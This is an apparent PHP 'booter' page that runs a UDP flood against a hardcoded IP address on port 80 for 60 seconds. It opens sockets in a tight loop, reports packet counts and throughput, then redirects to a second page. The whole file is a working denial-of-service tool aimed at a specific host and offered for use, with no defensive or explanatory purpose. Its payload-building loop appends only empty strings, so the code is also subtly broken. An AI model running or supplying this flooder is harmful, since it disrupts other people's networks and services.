<html>
<style type="text/css">
body {
	background: url("");
	background-repeat: repeat;
	background-position: right;
	background-attachment: fixed;
	margin-top: 5%;
	margin-bottom: 5%;
	margin-left: 15%;
	margin-right: 15%;
	font-family:"Courier New", Courier, monospace;
	color: #808080;
	}
fieldset {
	border-style: none;
	margin: 10px;
	}
p {
	margin: 0;
	}
input {
	margin: 0;
	background-color: transparent;
	border: none;
	text-align: center;
	font-family:"Courier New", Courier, monospace;
	color: #808080;
	}
</style>

<?php
$packets = 0;
$ip = "147.237.72.69";
$rand = "80";
set_time_limit(0);
ignore_user_abort(FALSE);

$exec_time = "60";

$time = time();
print "Flooded: $ip on port $rand <br><br>";
$max_time = $time+$exec_time;



for($i=0;$i<65535;$i++){
        $out .= "";
}
while(1){
$packets++;
        if(time() > $max_time){
                break;
        }
        
        $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
        if($fp){
                fwrite($fp, $out);
                fclose($fp);
        }
}
echo "Packet complete at ".time('h:i:s')." with $packets (" . round(($packets*65)/1024, 2) . " mB) packets averaging ". round($packets/$exec_time, 2) . " packets/s \n";

function redirect($url) {
    if(!headers_sent()) {
        //If headers not sent yet... then do php redirect
        header('Location: '.$url);
        exit;
    } else {
        //If headers are sent... do javascript redirect... if javascript disabled, do html redirect.
        echo '<script type="text/javascript">';
        echo 'window.location.href="'.$url.'";';
        echo '</script>';
        echo '<noscript>';
        echo '<meta http-equiv="refresh" content="0;url='.$url.'" />';
        echo '</noscript>';
        exit;
    }
}

// How to use
$url = "2.php";
redirect($url);

?>

</html>